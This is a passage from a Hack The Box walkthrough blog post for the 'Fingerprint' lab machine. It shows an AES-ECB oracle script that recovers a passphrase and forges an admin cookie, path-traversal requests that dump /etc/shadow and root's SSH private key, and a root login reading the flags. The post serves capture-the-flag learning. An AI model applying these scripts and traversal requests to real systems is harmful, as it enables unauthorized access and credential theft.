class="keyword">while</span> True:</span><br><span class="line">        request = session.post(<span class="string">&quot;http://localhost:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>:<span class="string">&quot;\x01&quot;</span>*(start_block_gap-len(known))&#125;, cookies=cookies, allow_redirects=False)</span><br><span class="line">        userid = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">        bblock = getBlocks(userid)</span><br><span class="line">        <span class="built_in">print</span>(bblock[3])</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> printable:</span><br><span class="line">            request = session.post(<span class="string">&quot;http://localhost:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>:<span class="string">&quot;\x01&quot;</span>*(start_block_gap-len(known))+known+character&#125;, cookies=cookies, allow_redirects=False)</span><br><span class="line">            userid = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">            block = getBlocks(userid)</span><br><span class="line">            <span class="keyword">if</span>(block[3] == bblock[3]):</span><br><span class="line">                <span class="built_in">print</span>(known+character)</span><br><span class="line">                known+=character</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    cookies = &#123;<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line">    UIDLen = 128</span><br><span class="line">    blockSize = 32</span><br><span class="line">    start_block_gap = 63</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># python3 att.py                                                                                                              1 ⨯</span></span><br><span class="line">f45c2407de3a6ead5cc9b932f55fdf92</span><br><span class="line">,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr45</span><br><span class="line">2cbf5b00a2b8f3c89a9c62ce1dbe19d0</span><br><span class="line">,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453</span><br></pre></td></tr></table></figure>

<p>yes, we did…</p>
<p>After using this, we can try retrieve a working cookie to give ourselves access to the admin portal:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    r = session.post(<span class="string">&quot;http://localhost:8088/profile&quot;</span>, data = &#123;<span class="string">&quot;new_name&quot;</span>:<span class="string">&quot;\x01&quot;</span>*(start_block_gap-len(known))+known&#125;, cookies=cookies, allow_redirects=False)</span><br><span class="line">    UID = r.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(UID)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_block_gap = 64</span><br><span class="line">    known = <span class="string">&quot;,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true&quot;</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line">    session = requests.session()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Running the script, I get the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># python3 cook.py </span></span><br><span class="line">1864bc52a87c7c688573a0fff1aea89cfb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef</span><br></pre></td></tr></table></figure>

<p>Finally, we reuse our LFI to geet root’s flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/view/../../etc/shadow HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8088</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: CATS=95dvh0oeepi123t462f8l9ogjn; JSESSIONID=04cd9eef705ab7196f449e33a540; user_id=1864bc52a87c7c688573a0fff1aea89cfb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root:$6$majc7QP4<span class="variable">$VMJpElFyLIyyBoq4QFLBGkuY0q9BrThALCyM54jGim</span>.gJQlOsVUBI5nmu70LNV1FV2GxiyqbpzMkFk/x9ahgc1:18928:0:99999:7:::</span><br><span class="line">daemon:*:18480:0:99999:7:::</span><br><span class="line">bin:*:18480:0:99999:7:::</span><br><span class="line">sys:*:18480:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18480:0:99999:7:::</span><br><span class="line">games:*:18480:0:99999:7:::</span><br><span class="line">man:*:18480:0:99999:7:::</span><br><span class="line">lp:*:18480:0:99999:7:::</span><br><span class="line">mail:*:18480:0:99999:7:::</span><br><span class="line">news:*:18480:0:99999:7:::</span><br><span class="line">uucp:*:18480:0:99999:7:::</span><br><span class="line">proxy:*:18480:0:99999:7:::</span><br><span class="line">www-data:*:18480:0:99999:7:::</span><br><span class="line">backup:*:18480:0:99999:7:::</span><br><span class="line">list:*:18480:0:99999:7:::</span><br><span class="line">irc:*:18480:0:99999:7:::</span><br><span class="line">gnats:*:18480:0:99999:7:::</span><br><span class="line">nobody:*:18480:0:99999:7:::</span><br><span class="line">systemd-network:*:18480:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18480:0:99999:7:::</span><br><span class="line">syslog:*:18480:0:99999:7:::</span><br><span class="line">messagebus:*:18480:0:99999:7:::</span><br><span class="line">_apt:*:18480:0:99999:7:::</span><br><span class="line">lxd:*:18480:0:99999:7:::</span><br><span class="line">uuidd:*:18480:0:99999:7:::</span><br><span class="line">dnsmasq:*:18480:0:99999:7:::</span><br><span class="line">landscape:*:18480:0:99999:7:::</span><br><span class="line">pollinate:*:18480:0:99999:7:::</span><br><span class="line">sshd:*:18896:0:99999:7:::</span><br><span class="line">john:$6<span class="variable">$lK2ZQ</span>//M<span class="variable">$Ix2MY</span>.gi6rgcXRVuxRxWj4vPzKxS5IRNKkY.lQpVTdu0ukcERk1dzTm6GrSucBsd1DqvLpnxRuw.3QsWyzp3j0:18896:0:99999:7:::</span><br><span class="line">mysql:!:18896:0:99999:7:::</span><br><span class="line">flask:!:18896:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>and get root’s ssh key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/view/../../root/.ssh/id_rsa HTTP/1.1</span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAvBdEECQOhzxNhtcyq8/TU6T1hbSK2WYbpF3OBMlCKUeh5Z62</span><br><span class="line">i9RmFG1BVU5i7IMAVelL92WrGgYXfp2A9oIeLugEIjGcqAkK0aqWM6PnaSvGsnzj</span><br><span class="line">wmncPtNqudxWMPMozOc5baf9RIWDGG84KZrhk+FMt75amL6uFgz/ztXsHAotrBF8</span><br><span class="line">QLdKU92/jddEd4c5T5N4kpLm+cR2vYH4JW12mp2/vthkM1kD0g0q6u6i7Ofl/XQi</span><br><span class="line">gRn8oJmh54+SMc+HgQKhtTf0u1Dg15Ij9GvdlFn4iz/jUF93vZz4wFD58q9N2R9u</span><br><span class="line">lZWTCm+BOqhca0jNaQgX5kQtkZ2uoU/XqzunIQIDAQABAoIBAQCuMn3+1OX/qYHD</span><br><span class="line">mBp9tQRrOyOIqSTPIxoGqDndhOeZg5YVK2C1MAk6cdVIREip8smkx2Rrw+UrPOkV</span><br><span class="line">gpmls+xwVME/SeNkXLuAYxSozuvLI5fqRnBJ5fDs3rDBYacRvqHS43L0c9jEVUKM</span><br><span class="line">prTFE4RHiSmcIteVD0P7eB6SWN1LOSrKxMipTUhRG3m1b6QyQEO8S2zPxqklQxHh</span><br><span class="line">pq5zcZaLINr5TVwB7jiDidfbIN3obIBzTU1WrCn5Re8Tyu1Xlmljva1U3kfjhlSL</span><br><span class="line">iuMlYPi4omt6ZODy9qnImJvCh35ZhIs1tyR1XFwtyeOermwwDFbOEX14bNk1c7Nb</span><br><span class="line">QgebG7gBAoGBAOlQmS3HIdEnuaJeQCqJQ2MQP50O0GEvvbB1IRLjPRKpW6amC2rv</span><br><span class="line">Udrmk/6SQUwcxEDNjLkcabn1BAw6ZKBsUjGydVnW+awRQqWmdL9CLcMhFI922V+G</span><br><span class="line">mb8DEq1dO4KsY909E23yq1R7z1De5r1wMzL85+2QeoadHEgAXsjKjbyxAoGBAM5h</span><br><span class="line">AWKxxdo4k2qv8FeAcy9xGbcpP9YUEnySCOVrFYYAenR+oeWHmojF8T8WAAChdsgc</span><br><span class="line">YHmbPi0etlAX4pAt3ww05SPjdUNb81avAiKphRITVF/hr1DWqdSrjHgmO8JhPgY+</span><br><span class="line">132qO8rHjnfsMmh+eSWQXPy1O9yYVed1sgzDlG1xAoGAWBNY//MATRiV9zllN6mB</span><br><span class="line">itADc6K3/zgqf4Z36c1mrLjKJGriPIgDeoM4sw07ISRq4Zu219pl/xEDaipQ+k5p</span><br><span class="line">6ODZdAS3U8FgS3A++kRdSiAextmyzWDegUEDt/ZOFNJHEKmRwBuvmcDzTjAXIsRM</span><br><span class="line">T58xXnkAB/kfR/77yQjN4MECgYEAw5fsWD1j5o34KQTWJBf5Et1+IblWZu5fFvDQ</span><br><span class="line">vZ3fqECLzhy2E3ORYk83dTLEjdR5Xu6GALrBEsIox3/bmgnfexImmPzaBhz/Ywg6</span><br><span class="line">Xd+L3rWzIawjG9pW2tg7KSQTPwYqYoDseoz8XhMDU2Tn4WD8MD3B4z9gnJFD2ToS</span><br><span class="line">pUY3RgECgYEAyWrVpT9rI4j2pDC/ht54dtCltxw+jcZp5F57IsAy7ldlsefuwoNr</span><br><span class="line">GWUYBeBWuK8vx14XYNvMt45eg/GaU02VSoczuNPIvOoKbrH3+BXK290zxvwznqTS</span><br><span class="line">oggFxgjTq+oAawHPmDGDrWgqoa/Aecd6C0t94Tv7avfE9ZBJ4QWMsms=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>and we can get both user and root flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa                                      </span></span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@10.10.11.127 </span></span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-163-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Thu Feb  3 16:28:29 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.05              Processes:           165</span><br><span class="line">  Usage of /:   54.5% of 6.82GB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 22%               IP address <span class="keyword">for</span> eth0: 10.10.11.127</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Thu Feb  3 16:11:52 2022 from 10.10.14.25</span><br><span class="line">root@fingerprint:~<span class="comment"># cat root.txt </span></span><br><span class="line">0199cf2de74d5952dc56bb24543a5b32</span><br><span class="line">root@fingerprint:~<span class="comment"># cat /home/john/user.txt </span></span><br><span class="line">28b1f5b9f3b4d8ed1edc0914ee9c78e1</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2145.jpg"></li>
</ul>
<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>LFI read users.db file</li>
<li>xss steal admin’s auth_secondary param</li>
<li>decode jwt cookie and then forge</li>
<li>Hibernate Query Language Injection bypass login</li>
<li>RCE via forged jwt cookie to get a reverse shell</li>
<li>py script extract id_rsa key through SUID binary</li>
<li>java classes has a hibernate password commented out</li>
<li>forge admin’s user_id through custom AES-ECB script</li>
<li>LFI reuse to get root’s flag and root’s ssh key</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2022/02/03/fingerprint/" title="Hack-The-Box-walkthrough[fingerprint]">https://fdlucifer.github.io/2022/02/03/fingerprint/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/01/23/meta/" rel="prev" title="Hack-The-Box-walkthrough[meta]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[meta]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/14/stacked/" rel="next" title="Hack-The-Box-walkthrough[stacked]">
                  Hack-The-Box-walkthrough[stacked] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">634k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:26</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
